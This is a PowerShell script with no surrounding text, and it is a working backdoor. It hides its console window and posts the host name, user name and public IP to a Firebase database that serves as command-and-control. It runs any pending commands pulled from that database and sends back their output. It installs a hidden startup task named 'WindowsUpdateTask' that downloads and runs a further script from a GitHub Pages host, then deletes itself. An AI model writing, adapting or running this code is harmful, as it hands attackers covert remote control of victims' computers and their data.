$C2 = "https://nextechdevops.github.io/a9438f"
$FB = "https://thumbnail-log-default-rtdb.europe-west1.firebasedatabase.app"

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

$beacon = @{
    host = $env:COMPUTERNAME
    user = $env:USERNAME
    time = (Get-Date -UFormat %s)
    ip = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing).Content.Trim()
}
Invoke-RestMethod -Uri "$FB/beacons.json" -Method POST -Body ($beacon | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue

$commands = Invoke-RestMethod -Uri "$FB/commands.json" -Method GET -ErrorAction SilentlyContinue
if ($commands) {
    foreach ($key in $commands.PSObject.Properties.Name) {
        $cmd = $commands.$key
        if ($cmd.status -eq "pending") {
            try {
                $output = Invoke-Expression $cmd.command 2>&1 | Out-String
                $result = @{
                    command = $cmd.command
                    output = $output
                    time = (Get-Date -UFormat %s)
                }
                Invoke-RestMethod -Uri "$FB/results.json" -Method POST -Body ($result | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
                $cmd.status = "completed"
            } catch {
                $cmd.status = "failed"
            }
        }
    }
}

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"& { iex (New-Object Net.WebClient).DownloadString('$C2/update.ps1') }`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName "WindowsUpdateTask" -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue

Start-Sleep -Seconds 10
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue